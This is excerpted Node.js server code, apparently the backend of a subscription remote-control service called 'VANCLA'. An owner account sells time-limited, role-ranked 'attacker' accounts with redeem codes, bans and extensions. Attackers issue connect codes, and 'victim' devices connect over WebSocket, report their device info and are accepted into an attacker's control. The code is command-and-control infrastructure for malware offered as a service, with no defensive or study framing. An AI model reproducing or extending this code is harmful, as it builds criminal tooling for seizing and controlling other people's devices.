...
function auth(req, res, next) {
  ...
  if (!t) return res.status(401).json({ success: false, message: 'Token required' });
  try { 
...
app.post('/api/owner/login', (req, res) => {
  ...
  if (username !== 'VANCLAOWN') return res.json({ success: false, message: 'Invalid credentials' });
  const db = DB.get();
  if (!bcrypt.compareSync(password, db.owner_hash))
    return res.json({ success: false, message: 'Invalid credentials' });
  const token = jwt.sign({ id: 'owner', role: 'owner', username: 'VANCLAOWN' }, SECRET, { expiresIn: '24h' });
...
app.get('/api/owner/stats', ownerOnly, (req, res) => {
  ...
  db.attackers.forEach(a => { 
    if (!a.banned && roleCounts[a.role] !== undefined) roleCounts[a.role]++; 
  });
  res.json({
    success: true,
    total_attackers: db.attackers.filter(a => !a.banned).length,
    online_attackers: attackers.size,
    online_victims: victims.size,
    total_codes: db.connect_codes.length,
    total_redeem: db.redeem_codes.filter(r => r.active).length,
...
app.get('/api/owner/attackers', ownerOnly, (req, res) => {
  ...
  res.json({
    ...
    attackers: db.attackers.map(a => ({
      ...
      banned: a.banned || false, ban_reason: a.ban_reason || '',
...
app.post('/api/owner/attackers', ownerOnly, (req, res) => {
  ...
  DB.update(db => {
    ...
    const exp = new Date(Date.now() + (parseInt(days) || 30) * 86400000);
    db.attackers.push({
      id: uuid(), username, password: bcrypt.hashSync(password, 10),
      role, created_at: new Date().toISOString(), expires_at: exp.toISOString(),
...
app.put('/api/owner/attackers/:id/role', ownerOnly, (req, res) => {
  ...
  DB.update(db => {
    ...
    if (conn && conn.ws.readyState === WebSocket.OPEN) {
      conn.ws.send(JSON.stringify({ type: 'role_updated', role }));
    }
  });
});
...
app.put('/api/owner/attackers/:id/ban', ownerOnly, (req, res) => {
  ...
  DB.update(db => {
    ...
    if (banned) {
      const conn = attackers.get(a.id);
      if (conn && conn.ws.readyState === WebSocket.OPEN) { 
        conn.ws.send(JSON.stringify({ type: 'banned', reason: reason || '' })); 
        conn.ws.close(); 
      }
...
app.put('/api/owner/attackers/:id/extend', ownerOnly, (req, res) => {
  ...
  DB.update(db => {
    const a = db.attackers.find(x => x.id === req.params.id);
    if (!a) return res.json({ success: false, message: 'Not found' });
    const exp = new Date(Math.max(new Date(a.expires_at), new Date()));
    exp.setDate(exp.getDate() + days);
    a.expires_at = exp.toISOString();
...
app.delete('/api/owner/attackers/:id', ownerOnly, (req, res) => {
  DB.update(db => {
    ...
    attackers.delete(req.params.id);
    res.json({ success: true });
  });
});
...
app.post('/api/owner/redeem', ownerOnly, (req, res) => {
  ...
  DB.update(db => {
    ...
    if (custom_code && db.redeem_codes.find(r => r.code === custom_code)) {
      return res.json({ success: false, message: 'Kode sudah ada' });
    }
    const rc = {
      id: uuid(),
...
app.post('/api/attacker/login', (req, res) => {
  ...
  if (new Date(a.expires_at) < new Date()) return res.json({ success: false, expired: true, message: 'Akun expired' });
  ...
  const days_left = Math.max(0, Math.floor((new Date(a.expires_at) - new Date()) / 86400000));
  res.json({ success: true, token, role: a.role, username: a.username, days_left });
});

app.post('/api/attacker/codes', auth, (req, res) => {
  if (req.user.role === 'owner') return res.json({ success: false, message: 'Not allowed' });
  DB.update(db => {
    // Cleanup expired codes from this attacker
...
app.get('/api/attacker/codes', auth, (req, res) => {
  const db = DB.get();
  const codes = db.connect_codes.filter(c =>
    c.attacker_id === req.user.id && new Date(c.expires_at) > new Date()
  );
...
app.post('/api/attacker/redeem', auth, (req, res) => {
  ...
  DB.update(db => {
    ...
    if (rc.type === 'duration') {
      const exp = new Date(Math.max(new Date(a.expires_at), new Date()));
      exp.setDate(exp.getDate() + rc.days);
      a.expires_at = exp.toISOString();
    } else if (rc.type === 'upgrade' && rc.target_role) {
      const cur = ROLES.indexOf(a.role);
      const tgt = ROLES.indexOf(rc.target_role);
      if (tgt <= cur) return res.json({ success: false, message: 'Role kamu sudah lebih tinggi atau sama' });
...
app.post('/api/victim/validate', (req, res) => {
  ...
  if (!c) return res.json({ success: false, message: 'Kode tidak valid atau sudah expired' });
...
wss.on('connection', ws => {
  ...
  ws.on('message', data => {
    ...
    if (msg.type === 'attacker_connect') {
      try {
        ...
        if (!a || a.banned || new Date(a.expires_at) < new Date()) {
        ...
        log(`Attacker connected: ${a.username} [${a.role}]`);
        
        const activeVictims = [];
        victims.forEach((v, id) => {
          if (v.attackerId === user.id && !v.pending && v.ws.readyState === WebSocket.OPEN) {
            activeVictims.push({ victimId: id, deviceInfo: v.deviceInfo });
          }
        });
        ws.send(JSON.stringify({ type: 'connected', role: a.role, username: a.username, victims: activeVictims }));
    ...
    if (msg.type === 'victim_connect') {
      ...
      if (!c) {
        ws.send(JSON.stringify({ type: 'code_invalid', message: 'Kode tidak valid' }));
        ws.close(); return;
      }
      const vid = 'V' + uuid().substr(0, 8).toUpperCase();
      ws.role       = 'victim';
      ws.victimId   = vid;
      ws.attackerId = c.attacker_id;
      victims.set(vid, {
        ws, attackerId: c.attacker_id, code: msg.code,
        deviceInfo: msg.deviceInfo || {}, pending: true
      });
      ws.send(JSON.stringify({ type: 'code_valid', victimId: vid }));
      log(`Victim connected with code ${msg.code} → attacker ${c.attacker_id}`);
      
      const aConn = attackers.get(c.attacker_id);
      if (aConn && aConn.ws.readyState === WebSocket.OPEN) {
        aConn.ws.send(JSON.stringify({
          type: 'victim_pending', victimId: vid,
          deviceInfo: msg.deviceInfo || {}, code: msg.code
        }));
      }
      return;
    }

    // ── ATTACKER: ACCEPT VICTIM ──────────────────────
    if (ws.role === 'attacker' && msg.type === 'add_victim') {
      ...
      if (v.ws.readyState !== WebSocket.OPEN) {
        ...
        ws.send(JSON.stringify({ type: 'victim_offline', victimId: msg.victimId }));
        return;
      }
      v.pending = false;
    ...
    // ── ATTACKER: REJECT VICTIM ───────────────────
    if (ws.role === 'attacker' && msg.type === 'reject_victim') {
      const v = victims.get(msg.victimId);
      if (v) {
        if (v.ws.readyState === WebSocket.OPEN) {
          v.ws.send(JSON.stringify({ type: 'connection_rejected' }));
        }
        victims.delete(msg.victimId);
      }
      return;
  ...
  ws.on('close', () => {
    if (ws.role === 'attacker') {
      attackers.delete(ws.userId);
      log(`Attacker disconnected: ${ws.userId}`);
    }
    if (ws.role === 'victim' && ws.victimId) {
      const aConn = attackers.get(ws.attackerId);
      if (aConn && aConn.ws.readyState === WebSocket.OPEN) {
        aConn.ws.send(JSON.stringify({ type: 'victim_offline', victimId: ws.victimId }));
      }
      victims.delete(ws.victimId);
      log(`Victim disconnected: ${ws.victimId}`);
    }
  });
...
server.listen(PORT, '0.0.0.0', () => log(`VANCLA Server running on port ${PORT}`));